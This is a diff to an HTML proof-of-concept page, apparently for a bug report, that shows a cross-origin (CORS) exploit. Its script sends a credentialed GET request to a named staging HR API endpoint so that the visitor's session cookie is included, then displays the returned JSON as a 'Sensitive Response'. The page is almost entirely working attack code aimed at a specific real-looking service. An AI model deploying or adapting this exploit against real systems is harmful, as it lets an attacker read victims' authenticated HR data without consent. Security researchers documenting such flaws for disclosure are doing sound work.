@@ -5,7 +5,7 @@
   <title>CORS GET PoC</title>
 </head>
 <body>
-  <h2>CORS GET PoC</h2>
+  <h2>CORS Exploit PoC (GitHub Pages)</h2>
   <button onclick="exploit()">Exploit</button>
 
   <pre id="output"></pre>
@@ -15,14 +15,12 @@
       fetch("https://api.stg.hrms.powerschoolcorp.com/svc/hrms-api/widget/mykeydata", {
         method: "GET",
         mode: "cors",
-        credentials: "include", // ensures sid cookie is sent
-        headers: {
-          "Accept": "*/*"
-        }
+        credentials: "include"
       })
-      .then(res => res.text())
+      .then(res => res.json())
       .then(data => {
-        document.getElementById("output").innerText = "Response:\n" + data;
+        document.getElementById("output").innerText =
+          "Sensitive Response:\n" + JSON.stringify(data, null, 2);
       })
       .catch(err => {
         document.getElementById("output").innerText = "Error:\n" + err;
